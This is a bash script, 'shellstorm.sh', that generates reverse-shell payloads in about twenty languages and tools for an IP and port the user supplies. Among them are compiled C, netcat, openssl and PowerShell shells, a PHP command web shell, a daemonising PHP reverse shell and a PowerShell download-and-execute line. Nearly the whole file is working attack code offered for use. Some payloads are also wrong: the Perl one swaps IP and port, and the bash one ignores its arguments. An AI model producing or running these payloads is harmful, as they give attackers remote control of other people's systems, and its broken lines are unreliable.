#!/bin/bash

function _HEADER_(){
printf "\e[0;33m"
cat << "EOF"
  _________ ___ ______________.____    .____       ____________________________ __________    _____
 /   _____//   |   \_   _____/|    |   |    |     /   _____/\__    ___/\_____  \\______   \  /     \
 \_____  \/    ~    \    __)_ |    |   |    |     \_____  \   |    |    /   |   \|       _/ /  \ /  \
 /        \    Y    /        \|    |___|    |___  /        \  |    |   /    |    \    |   \/    Y    \
/_______  /\___|_  /_______  /|_______ \_______ \/_______  /  |____|   \_______  /____|_  /\____|__  /
        \/       \/        \/         \/       \/        \/                    \/       \/         \/

EOF
printf "\e[0m"
}

function _HELP_(){

	printf "%s\n\n" "Usage bash shellstorm.sh <language/program> <ip> <port>"
	printf "%s\n" "Example:"
	printf "%s\n" "bash shellstorm.sh java 127.0.0.1 1337"
}

function _list_(){

	printf "\nLanguages:\n\n"
	printf "[\e[0;32m+\e[0m] awk\n"
	printf "[\e[0;32m+\e[0m] bash\n"
	printf "[\e[0;32m+\e[0m] c\n"
	printf "[\e[0;32m+\e[0m] cpan\n"
	printf "[\e[0;32m+\e[0m] gawk\n"
	printf "[\e[0;32m+\e[0m] golang\n"
	printf "[\e[0;32m+\e[0m] java\n"
	printf "[\e[0;32m+\e[0m] nc\n"
	printf "[\e[0;32m+\e[0m] nodejs\n"
	printf "[\e[0;32m+\e[0m] openssl\n"
	printf "[\e[0;32m+\e[0m] perl\n"
	printf "[\e[0;32m+\e[0m] php\n"
	printf "[\e[0;32m+\e[0m] php-simple\n"
	printf "[\e[0;32m+\e[0m] php-daemon\n"
	printf "[\e[0;32m+\e[0m] ps1\n"
	printf "[\e[0;32m+\e[0m] ps1-ds  (download string)\n"
	printf "[\e[0;32m+\e[0m] python\n"
	printf "[\e[0;32m+\e[0m] ruby\n"
	printf "[\e[0;32m+\e[0m] socat\n"
	printf "[\e[0;32m+\e[0m] telnet\n"

}

#################################### PROGRAMS/LANGUAGES FUNCTIONS ############################################
function _awk_(){

        printf "awk 'BEGIN {s = \"/inet/tcp/0/$2/$3\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

}

function _bash_(){

	printf "bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\"\n\n"
	printf "bash -c \"bash -l > /dev/tcp/127.0.0.1/4444 0<&1 2>&1\""
}

function _c_(){

cat <<EOF > /tmp/Cprog.c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $3;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("$2");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}

EOF

}



function _cpan_(){
cat <<EOF
printf "y" | cpan && printf "! use Socket; my \\\$i=\"$2\"; my \\\$p=$3; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};" | cpan
EOF
}

function _gawk_(){
	printf "gawk 'BEGIN {P=$3;S=\"> \";H=\"$2\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
}



function _golang_(){
	printf "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$2:$3\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
}


function _java_(){

	echo "printf 'import java.io.*;\n        public class LinuxRevShellExec {\n                public static void main(String[] args) {\n                try {\n                        String[] payload = {\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/$2/$3 0>&1\"};\n                        //String[] payload_b = {\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$2/$3;cat <&5 | while read line; do \$line 2>&5 >&5; done\"};\n                        Process p = Runtime.getRuntime().exec(payload);\n                        BufferedReader in = new BufferedReader(\n                                new InputStreamReader(p.getInputStream()));\n                        String line = null;\n                         while ((line = in.readLine()) != null) {\n                                System.out.println(line);\n                        }\n                }\n             catch (IOException e) {\n                e.printStackTrace();\n                }\n        }\n}\n' > /tmp/payload.java && java /tmp/payload.java"

}

function _netcat_(){
	printf "nc -lvp $3\n\n"
	printf "mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc $2 $3 1>/tmp/backpipe"
}


function _nodejs_(){
	printf "echo \"require('child_process').exec('nc -e /bin/sh $2 $3')\" > /tmp/nd.js && nodejs /tmp/nd.js && rm /tmp/nd.js"
}


function _openssl_(){

	printf "[\e[0;33m+\e[0m] Target payload\n\n"
        printf "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $2:$3 > /tmp/s; rm /tmp/s"
        printf "\n\n"

        printf "[\e[0;32m+\e[0m] Creating ssl certs\n"
        openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj "/C=UN/ST=Unknown/L=Unknown/O=Unk/CN=www.unknowsite.com"
        printf "\n"

        printf "[\e[0;32m+\e[0m] Starting openssl server\n"
        printf "[\e[0;32m+\e[0m] Listening in $3\n\n"
        printf "Openssl server waiting for incomming connection\n"
        openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port $3

        ##########################
        # OR set netcat listener #
        ############################
        # ncat --ssl -vv -l -p $3  #
        ############################
}



function _perl_(){
	printf "perl -e 'use Socket;\$i=\"$3\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
}

function _php_(){
        printf "php -r '\$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

}

function _php_web_simple_(){

cat <<EOF

<?php

if(isset(\$_REQUEST['cmd'])){
        echo "<pre>";
        \$cmd = (\$_REQUEST['cmd']);
        system(\$cmd);
        echo "</pre>";
        die;
}

?>

EOF

}


function _php_web_daemon_(){

cat <<EOF

<?php

set_time_limit (0);
\$VERSION = "1.0";
\$ip = "$2";
\$port = $3;
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        \$pid = pcntl_fork();

        if (\$pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if (\$pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        \$daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) {
        printit("\$errstr (\$errno)");
        exit(1);
}

// Spawn shell process
\$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit("Successfully opened reverse shell to \$ip:\$port");

while (1) {
        // Check for end of TCP connection
        if (feof(\$sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof(\$pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down \$sock, or some
        // command output is available on STDOUT or STDERR
        \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
        \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array(\$sock, \$read_a)) {
                if (\$debug) printit("SOCK READ");
                \$input = fread(\$sock, \$chunk_size);
                if (\$debug) printit("SOCK: \$input");
                fwrite(\$pipes[0], \$input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array(\$pipes[1], \$read_a)) {
                if (\$debug) printit("STDOUT READ");
                \$input = fread(\$pipes[1], \$chunk_size);
                if (\$debug) printit("STDOUT: \$input");
                fwrite(\$sock, \$input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array(\$pipes[2], \$read_a)) {
                if (\$debug) printit("STDERR READ");
                \$input = fread(\$pipes[2], \$chunk_size);
                if (\$debug) printit("STDERR: \$input");
                fwrite(\$sock, \$input);
        }
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit (\$string) {
        if (!\$daemon) {
                print "\$string\n";
        }
}

?> 



EOF

}



function _python_(){
	printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$2\",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
}

function _ruby_(){
	printf "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$2\",\"$3\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
}


function _telnet_(){

	if [[ -z "$4" ]]
	then
		printf "Telnet shell needs two ports, one to send commands and the other one to receive I/O\n"
		printf "Enter one more port different\n\n"
		printf "Usage bash shellstorm.sh telnet <rhost> <rsendport> <rioport>\n"
		printf "Example: bash shellstorm.sh telnet 127.0.0.1 4444 4445\n"
		exit
	fi

        rhost="$2"
        rsendport="$3"
        rioport="$4"

        printf "telnet $rhost $rsendport | /bin/bash | telnet $rhost $rioport"
        printf "\n\n\e[0;33m"
        printf "\e[4mYou need set up two netcat listeners\n"
        printf "One to send commands in port $rsendport\n"
        printf "The other one to receive stdout in port $rioport\e[0m\n"

}


function _socat_(){
        printf "socat tcp-connect:$2:$3 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
}


function _ps1_(){
	printf "\$client = New-Object System.Net.Sockets.TCPClient(\"$2\",$3);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close();"
}

function _ps1_download_string_(){
	rfile="webshell.txt"
        printf "powershell -ExecutionPolicy Bypass -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$2:$3/$rfile');\""
}

############################################################################################## END PROGRAMS/LANGUAGES FUNCTIONS #




################################### ARGS HANDLERS ################################

if [[ -z "$1" ]] || [[ -z "$2" ]] || [[ -z "$3" ]]
then
	_HELP_
	_list_
	exit
fi

_HEADER_

if [[ "$1" == "awk" ]];
then
	printf "==========[ AWK ]==========\n\n"
	_awk_ "$1" "$2" "$3" 

elif [[ "$1" == "bash" ]];
then
	printf "==========[ BASH ]==========\n\n"
	_bash_ "$1" "$2" "$3"

elif [[ "$1" == "c" ]];
then
	printf "==========[ C ]==========\n\n"
	_c_ "$1" "$2" "$3"
        gcc /tmp/Cprog.c -o /tmp/revshell
        cat /tmp/Cprog.c
	printf "Binary file is already compiled and stored in /tmp/revshell\n"


elif [[ "$1" == "cpan" ]];
then
	printf "==========[ CPAN ]==========\n\n"
        _cpan_ "$1" "$2" "$3"


elif [[ "$1" == "gawk" ]];
then
	printf "==========[ GAWK ]==========\n\n"
        _gawk_ "$1" "$2" "$3"



elif [[ "$1" == "golang" ]];
then
	printf "==========[ GO ]==========\n\n"
        _golang_ "$1" "$2" "$3"


elif [[ "$1" == "java" ]];
then
	printf "==========[ JAVA ]==========\n\n"
        _java_ "$1" "$2" "$3"


elif [[ "$1" == "nc" ]];
then
	printf "==========[ NETCAT ]==========\n\n"
        _netcat_ "$1" "$2" "$3"


elif [[ "$1" == "nodejs" ]];
then
	printf "==========[ NODEJS ]==========\n\n"
        _nodejs_ "$1" "$2" "$3"


elif [[ "$1" == "openssl" ]];
then
        printf "==========[ OPENSSL ]==========\n\n"
        _openssl_ "$1" "$2" "$3"





elif [[ "$1" == "perl" ]];
then
	printf "==========[ PERL ]==========\n\n"
        _perl_ "$1" "$2" "$3"

elif [[ "$1" == "php" ]];
then
	printf "==========[ PHP ]==========\n\n"
        _php_ "$1" "$2" "$3"


elif [[ "$1" == "php-simple" ]];
then
        printf "==========[ PHP WEB SIMPLE ]==========\n\n"
	_php_web_simple_ "$1" "$2" "$3"


elif [[ "$1" == "php-daemon" ]];
then
        printf "==========[ PHP WEB DAEMON ]==========\n\n"
        _php_web_daemon_ "$1" "$2" "$3"

elif [[ "$1" == "python" ]];
then
	printf "==========[ PYTHON ]==========\n\n"
        _python_ "$1" "$2" "$3"


elif [[ "$1" == "ruby" ]];
then
	printf "==========[ RUBY ]==========\n\n"
        _ruby_ "$1" "$2" "$3"


elif [[ "$1" == "socat" ]];
then
	printf "==========[ SOCAT ]==========\n\n"
        _socat_ "$1" "$2" "$3"


elif [[ "$1" == "telnet" ]];
then
        printf "==========[ TELNET ]==========\n\n"
	_telnet_ "$1" "$2" "$3" "$4"

elif [[ "$1" == "ps1" ]];
then
	printf "==========[ PS1 ]==========\n\n"
        _ps1_ "$1" "$2" "$3"


elif [[ "$1" == "ps1-ds" ]];
then
        printf "==========[ PS1 DOWNLOAD STRING ]==========\n\n"
	_ps1_download_string_ "$1" "$2" "$3"

else
	printf "Language/Program $1 no available\n"
fi
